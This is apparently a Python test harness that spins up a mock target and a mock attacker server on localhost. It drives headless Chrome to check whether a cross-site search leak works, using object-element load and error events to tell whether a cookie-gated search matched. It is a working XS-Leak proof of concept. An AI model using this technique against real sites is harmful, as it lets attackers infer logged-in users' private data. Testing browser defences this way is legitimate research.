import http.server, socketserver, threading, subprocess, time, os

class TargetHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        cookie = self.headers.get('Cookie', '')
        has_sid = 'sid=secret123' in cookie
        mode = self.headers.get('Sec-Fetch-Mode', '')
        print(f"[Target] Path: {self.path}, Cookie: {cookie}, Mode: {mode}")
        if self.path.startswith('/notes?search='):
            s = self.path.split('search=')[1]
            if has_sid and s.startswith('a'):
                self.send_response(200)
                self.send_header('Content-Type', 'text/html')
                self.end_headers()
                self.wfile.write(b'<h1>Match</h1>')
            else:
                self.send_response(404)
                self.send_header('Content-Type', 'text/html')
                self.end_headers()
                self.wfile.write(b'<h1>Not Found</h1>')
        elif self.path == '/set_cookie':
            self.send_response(200)
            self.send_header('Set-Cookie', 'sid=secret123; SameSite=Lax; HttpOnly')
            self.send_header('Content-Type', 'text/html')
            self.end_headers()
            self.wfile.write(b'Cookie set')
        else:
            self.send_error(404)

class AttackerHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        self.end_headers()
        self.wfile.write(b"""<!doctype html>
<html>
<body>
<div id="res">waiting</div>
<script>
let results = {};
function test(url, name) {
    return new Promise(resolve => {
        const obj = document.createElement('object');
        obj.data = url;
        obj.onload = () => { results[name] = 'LOAD'; resolve(); };
        obj.onerror = () => { results[name] = 'ERROR'; resolve(); };
        document.body.appendChild(obj);
        setTimeout(() => { if (!results[name]) { results[name] = 'TIMEOUT'; resolve(); } }, 1000);
    });
}
async function run() {
    await test('http://127.0.0.1:9999/notes?search=a', 'match_a');
    await test('http://127.0.0.1:9999/notes?search=b', 'nomatch_b');
    document.getElementById('res').textContent = JSON.stringify(results);
}
run();
</script>
</body>
</html>
""")

target_server = socketserver.TCPServer(('127.0.0.1', 9999), TargetHandler)
t1 = threading.Thread(target=target_server.serve_forever, daemon=True)
t1.start()

attacker_server = socketserver.TCPServer(('127.0.0.1', 9998), AttackerHandler)
t2 = threading.Thread(target=attacker_server.serve_forever, daemon=True)
t2.start()

chrome_path = r'C:\Program Files\Google\Chrome\Application\chrome.exe'
user_data = os.path.join(os.environ.get('TEMP', ''), 'chrome_test_profile')
os.makedirs(user_data, exist_ok=True)

# 1. Set cookie
subprocess.run([chrome_path, '--headless=new', f'--user-data-dir={user_data}', '--dump-dom', 'http://127.0.0.1:9999/set_cookie'], timeout=5)

# 2. Run test from attacker
p = subprocess.run([
    chrome_path,
    '--headless=new',
    f'--user-data-dir={user_data}',
    '--dump-dom',
    '--virtual-time-budget=3000',
    'http://127.0.0.1:9998/harness'
], capture_output=True, text=True, timeout=10)

for line in p.stdout.splitlines():
    if 'res' in line:
        print(line)

target_server.shutdown()
attacker_server.shutdown()
